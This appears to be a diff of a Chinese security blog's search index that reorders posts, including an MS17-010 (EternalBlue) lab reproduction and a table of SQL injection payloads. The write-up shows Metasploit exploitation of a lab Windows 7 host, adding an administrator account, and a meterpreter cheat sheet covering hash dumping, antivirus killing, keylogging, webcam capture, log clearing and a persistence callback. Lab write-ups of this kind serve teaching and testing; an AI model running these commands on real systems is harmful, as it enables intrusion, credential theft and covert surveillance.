@@ -50,7 +50,7 @@
 </tr>
 <tr>
 <td align="left">猜解表名、列名</td>
-<td align="left">1、union猜解 <br>猜表名 <br><code>?id=1 union select 1,2,3,4 from表名</code> <br>猜列名 <br><code>?id=1 union select 1,列名,3,4 from 表名</code> <br><br>2、exists猜解 <br>猜表名 <br><code>?id=1 and exists(select * from 表名)</code> <br>或 <br><code>?id=1 and 0 &lt; &gt; (select count(*) from 表名)</code> <br><br>猜列名 <br><code>?id=1 and exists(select 列名 from 表名)</code></td>
+<td align="left">1、union猜解 <br>猜表名 <br><code>?id=1 union select 1,2,3,4 from 表名</code> <br>猜列名 <br><code>?id=1 union select 1,列名,3,4 from 表名</code> <br><br>2、exists猜解 <br>猜表名 <br><code>?id=1 and exists(select * from 表名)</code> <br>或 <br><code>?id=1 and 0 &lt; &gt; (select count(*) from 表名)</code> <br><br>猜列名 <br><code>?id=1 and exists(select 列名 from 表名)</code></td>
 </tr>
 <tr>
 <td align="left">暴数据</td>
@@ -1646,111 +1646,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Java环境变量配置</title>
-    <url>/article/Java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<h2 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h2><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
-<p>2、新建 JAVA_HOME</p>
-<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>
-
-<p>3、新建 CLASSPATH</p>
-<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>
-
-<p>4、修改 Path-新增</p>
-<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br><span class="line">%JAVA_HOME%\jre\bin;</span><br></pre>
-
-<p>注！环境变量path中，首行删除java自带的环境变量，否则自定义变量无法生效</p>
-<pre class="highlight"><span class="line">C:\Program Files\Common Files\Oracle\Java\javapath</span><br></pre>
-
-<p>且移动环境变量配置于此行之上</p>
-<pre class="highlight"><span class="line">C:\Program Files(x86)\Common Files\Oracle\Java\javapath</span><br></pre>
-
-<p>最后注意移动任意绝对路径至行首，否则path路径再次打开将以单行显示</p>
-<h2 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h2><p>同上，无需修改</p>
-<h2 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h2><p>1、新建JAVA8_HOME、JAVA11_HOME（JAVA_HOME已在上面新建）</p>
-<p>2、新建java8.bat</p>
-<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA8_HOME%&quot; /m</span><br></pre>
-
-<p>3、新建java11.bat</p>
-<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA11_HOME%&quot; /m</span><br></pre>
-
-<p>注：管理员权限运行</p>
-<h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><p>家目录下执行</p>
-<pre class="highlight"><span class="line">vim .zshrc</span><br></pre>
-
-<p>最后一行添加</p>
-<pre class="highlight"><span class="line">alias java8=&quot;java8路径/bin/java&quot;</span><br></pre>
-
-<p>重新加载配置文件</p>
-<pre class="highlight"><span class="line">source .zshrc</span><br></pre>
-]]></content>
-      <categories>
-        <category>环境搭建</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MS17-010漏洞复现</title>
-    <url>/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h1><p>MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
-<h1 id="二、探测"><a href="#二、探测" class="headerlink" title="二、探测"></a>二、探测</h1><p>靶机：win7 x64 sp1 IP：192.168.66.98<br>攻击机：kali 2020.4 IP：192.168.66.138</p>
-<h2 id="1、通过nmap扫描目标机器，发现139、445端口"><a href="#1、通过nmap扫描目标机器，发现139、445端口" class="headerlink" title="1、通过nmap扫描目标机器，发现139、445端口"></a>1、通过nmap扫描目标机器，发现139、445端口</h2><pre class="highlight"><span class="line">nmap -V -T4 192.168.66.98   </span><br><span class="line">#T4设置扫描速度，越高越快（1-5）</span><br><span class="line">#-V显示详情</span><br></pre>
-
-<p>结果：</p>
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" alt="image-20210809161636575" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" class="lozad post-image"></p>
-<h2 id="2、使用msf探测是否存在MS17-010漏洞"><a href="#2、使用msf探测是否存在MS17-010漏洞" class="headerlink" title="2、使用msf探测是否存在MS17-010漏洞"></a>2、使用msf探测是否存在MS17-010漏洞</h2><p>a、寻找MS17-010模块</p>
-<pre class="highlight"><span class="line">search MS17-010</span><br></pre>
-
-<p>发现2个探测模块和4个利用模块</p>
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" alt="image-20210809161651064" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" class="lozad post-image"></p>
-<h2 id="3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测"><a href="#3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测" class="headerlink" title="3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测"></a>3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测</h2><pre class="highlight"><span class="line">use auxiliary/scanner/smb/smb_ms17_010   	#调用探测模块</span><br><span class="line">show options                 				#显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98          			#设置目标IP</span><br><span class="line">run                     					#运行探测程序</span><br></pre>
-
-<p>探测出存在MS17-010漏洞</p>
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" alt="image-20210809161701790" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" class="lozad post-image"></p>
-<h1 id="三、利用"><a href="#三、利用" class="headerlink" title="三、利用"></a>三、利用</h1><h2 id="1、使用攻击模块对靶机发起攻击"><a href="#1、使用攻击模块对靶机发起攻击" class="headerlink" title="1、使用攻击模块对靶机发起攻击"></a>1、使用攻击模块对靶机发起攻击</h2><pre class="highlight"><span class="line">use exploit/windows/smb/ms17_010_eternalblue    #调用攻击模块</span><br><span class="line">show options                                    #显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98                        #设置目标IP</span><br><span class="line">run                                             #运行探测程序</span><br></pre>
-
-<p>攻击成功，进入后渗透攻击阶段</p>
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" alt="image-20210809161712134" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" class="lozad post-image"></p>
-<h2 id="2、靶机信息收集"><a href="#2、靶机信息收集" class="headerlink" title="2、靶机信息收集"></a>2、靶机信息收集</h2><p>a、查看目标主机详细信息</p>
-<pre class="highlight"><span class="line">sysinfo</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" alt="image-20210809161720244" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" class="lozad post-image"></p>
-<p>b、查看当前获取的权限</p>
-<pre class="highlight"><span class="line">getuid</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" alt="image-20210809161730216" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" class="lozad post-image"></p>
-<p>system权限，无需提权</p>
-<h2 id="3、开启远程桌面"><a href="#3、开启远程桌面" class="headerlink" title="3、开启远程桌面"></a>3、开启远程桌面</h2><pre class="highlight"><span class="line">run getgui -e</span><br></pre>
-
-<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" alt="image-20210809161744651" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" class="lozad post-image"></p>
-<p>成功开启远程桌面</p>
-<h2 id="4、切换到cmd命令行模式"><a href="#4、切换到cmd命令行模式" class="headerlink" title="4、切换到cmd命令行模式"></a>4、切换到cmd命令行模式</h2><pre class="highlight"><span class="line">shell</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" alt="image-20210809161756295" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" class="lozad post-image"></p>
-<h2 id="5、添加用户"><a href="#5、添加用户" class="headerlink" title="5、添加用户"></a>5、添加用户</h2><pre class="highlight"><span class="line">net user  </span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" alt="image-20210809161805432" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" class="lozad post-image"></p>
-<pre class="highlight"><span class="line">net user hacker hacker.123 /add        #添加用户、密码</span><br><span class="line"></span><br><span class="line">net localgroup administrators hacker /add  #提权至管理员组</span><br><span class="line"></span><br><span class="line">net localgroup administrators        #查看管理员组成员</span><br></pre>
-
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" alt="image-20210809161814628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" class="lozad post-image"></p>
-<p>提权成功</p>
-<h2 id="6、开启远程桌面连接"><a href="#6、开启远程桌面连接" class="headerlink" title="6、开启远程桌面连接"></a>6、开启远程桌面连接</h2><p>a、win+r，输入mstsc调出远程桌面，输入账号密码进行远程桌面连接</p>
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" alt="image-20210809161826717" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" class="lozad post-image"></p>
-<p>b、成功连接至靶机</p>
-<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" alt="image-20210809161839547" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" class="lozad post-image"></p>
-<p>至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。</p>
-<p>附录</p>
-<pre class="highlight"><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br><span class="line">getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run                          #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389            #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line"></span><br><span class="line">clearev                       							#清除日志</span><br><span class="line"></span><br><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>MS17-010</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux随记</title>
     <url>/article/Linux%E9%9A%8F%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h1><h2 id="配置静态IP："><a href="#配置静态IP：" class="headerlink" title="配置静态IP："></a>配置静态IP：</h2><pre class="highlight"><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0 或ifcfg-ens33</span><br><span class="line"></span><br><span class="line">ONBOOT=yes</span><br><span class="line"></span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line"></span><br><span class="line">IPADDR=&quot;192.168.x.x&quot;</span><br><span class="line"></span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line"></span><br><span class="line">GATEWAY=&quot;192.168.x.1&quot;</span><br><span class="line">ifdown eth0   禁用网卡</span><br><span class="line"></span><br><span class="line">ifup eth0      启用网卡</span><br></pre>
@@ -2056,6 +1951,111 @@
       </tags>
   </entry>
   <entry>
+    <title>Java环境变量配置</title>
+    <url>/article/Java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<h2 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h2><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
+<p>2、新建 JAVA_HOME</p>
+<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>
+
+<p>3、新建 CLASSPATH</p>
+<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>
+
+<p>4、修改 Path-新增</p>
+<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br><span class="line">%JAVA_HOME%\jre\bin;</span><br></pre>
+
+<p>注！环境变量path中，首行删除java自带的环境变量，否则自定义变量无法生效</p>
+<pre class="highlight"><span class="line">C:\Program Files\Common Files\Oracle\Java\javapath</span><br></pre>
+
+<p>且移动环境变量配置于此行之上</p>
+<pre class="highlight"><span class="line">C:\Program Files(x86)\Common Files\Oracle\Java\javapath</span><br></pre>
+
+<p>最后注意移动任意绝对路径至行首，否则path路径再次打开将以单行显示</p>
+<h2 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h2><p>同上，无需修改</p>
+<h2 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h2><p>1、新建JAVA8_HOME、JAVA11_HOME（JAVA_HOME已在上面新建）</p>
+<p>2、新建java8.bat</p>
+<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA8_HOME%&quot; /m</span><br></pre>
+
+<p>3、新建java11.bat</p>
+<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA11_HOME%&quot; /m</span><br></pre>
+
+<p>注：管理员权限运行</p>
+<h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><p>家目录下执行</p>
+<pre class="highlight"><span class="line">vim .zshrc</span><br></pre>
+
+<p>最后一行添加</p>
+<pre class="highlight"><span class="line">alias java8=&quot;java8路径/bin/java&quot;</span><br></pre>
+
+<p>重新加载配置文件</p>
+<pre class="highlight"><span class="line">source .zshrc</span><br></pre>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MS17-010漏洞复现</title>
+    <url>/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h1><p>MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
+<h1 id="二、探测"><a href="#二、探测" class="headerlink" title="二、探测"></a>二、探测</h1><p>靶机：win7 x64 sp1 IP：192.168.66.98<br>攻击机：kali 2020.4 IP：192.168.66.138</p>
+<h2 id="1、通过nmap扫描目标机器，发现139、445端口"><a href="#1、通过nmap扫描目标机器，发现139、445端口" class="headerlink" title="1、通过nmap扫描目标机器，发现139、445端口"></a>1、通过nmap扫描目标机器，发现139、445端口</h2><pre class="highlight"><span class="line">nmap -V -T4 192.168.66.98   </span><br><span class="line">#T4设置扫描速度，越高越快（1-5）</span><br><span class="line">#-V显示详情</span><br></pre>
+
+<p>结果：</p>
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" alt="image-20210809161636575" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161636575.png" class="lozad post-image"></p>
+<h2 id="2、使用msf探测是否存在MS17-010漏洞"><a href="#2、使用msf探测是否存在MS17-010漏洞" class="headerlink" title="2、使用msf探测是否存在MS17-010漏洞"></a>2、使用msf探测是否存在MS17-010漏洞</h2><p>a、寻找MS17-010模块</p>
+<pre class="highlight"><span class="line">search MS17-010</span><br></pre>
+
+<p>发现2个探测模块和4个利用模块</p>
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" alt="image-20210809161651064" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161651064.png" class="lozad post-image"></p>
+<h2 id="3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测"><a href="#3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测" class="headerlink" title="3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测"></a>3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测</h2><pre class="highlight"><span class="line">use auxiliary/scanner/smb/smb_ms17_010   	#调用探测模块</span><br><span class="line">show options                 				#显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98          			#设置目标IP</span><br><span class="line">run                     					#运行探测程序</span><br></pre>
+
+<p>探测出存在MS17-010漏洞</p>
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" alt="image-20210809161701790" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161701790.png" class="lozad post-image"></p>
+<h1 id="三、利用"><a href="#三、利用" class="headerlink" title="三、利用"></a>三、利用</h1><h2 id="1、使用攻击模块对靶机发起攻击"><a href="#1、使用攻击模块对靶机发起攻击" class="headerlink" title="1、使用攻击模块对靶机发起攻击"></a>1、使用攻击模块对靶机发起攻击</h2><pre class="highlight"><span class="line">use exploit/windows/smb/ms17_010_eternalblue    #调用攻击模块</span><br><span class="line">show options                                    #显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98                        #设置目标IP</span><br><span class="line">run                                             #运行探测程序</span><br></pre>
+
+<p>攻击成功，进入后渗透攻击阶段</p>
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" alt="image-20210809161712134" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161712134.png" class="lozad post-image"></p>
+<h2 id="2、靶机信息收集"><a href="#2、靶机信息收集" class="headerlink" title="2、靶机信息收集"></a>2、靶机信息收集</h2><p>a、查看目标主机详细信息</p>
+<pre class="highlight"><span class="line">sysinfo</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" alt="image-20210809161720244" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161720244.png" class="lozad post-image"></p>
+<p>b、查看当前获取的权限</p>
+<pre class="highlight"><span class="line">getuid</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" alt="image-20210809161730216" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161730216.png" class="lozad post-image"></p>
+<p>system权限，无需提权</p>
+<h2 id="3、开启远程桌面"><a href="#3、开启远程桌面" class="headerlink" title="3、开启远程桌面"></a>3、开启远程桌面</h2><pre class="highlight"><span class="line">run getgui -e</span><br></pre>
+
+<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" alt="image-20210809161744651" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161744651.png" class="lozad post-image"></p>
+<p>成功开启远程桌面</p>
+<h2 id="4、切换到cmd命令行模式"><a href="#4、切换到cmd命令行模式" class="headerlink" title="4、切换到cmd命令行模式"></a>4、切换到cmd命令行模式</h2><pre class="highlight"><span class="line">shell</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" alt="image-20210809161756295" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161756295.png" class="lozad post-image"></p>
+<h2 id="5、添加用户"><a href="#5、添加用户" class="headerlink" title="5、添加用户"></a>5、添加用户</h2><pre class="highlight"><span class="line">net user  </span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" alt="image-20210809161805432" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161805432.png" class="lozad post-image"></p>
+<pre class="highlight"><span class="line">net user hacker hacker.123 /add        #添加用户、密码</span><br><span class="line"></span><br><span class="line">net localgroup administrators hacker /add  #提权至管理员组</span><br><span class="line"></span><br><span class="line">net localgroup administrators        #查看管理员组成员</span><br></pre>
+
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" alt="image-20210809161814628" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161814628.png" class="lozad post-image"></p>
+<p>提权成功</p>
+<h2 id="6、开启远程桌面连接"><a href="#6、开启远程桌面连接" class="headerlink" title="6、开启远程桌面连接"></a>6、开启远程桌面连接</h2><p>a、win+r，输入mstsc调出远程桌面，输入账号密码进行远程桌面连接</p>
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" alt="image-20210809161826717" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161826717.png" class="lozad post-image"></p>
+<p>b、成功连接至靶机</p>
+<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" alt="image-20210809161839547" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809161839547.png" class="lozad post-image"></p>
+<p>至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。</p>
+<p>附录</p>
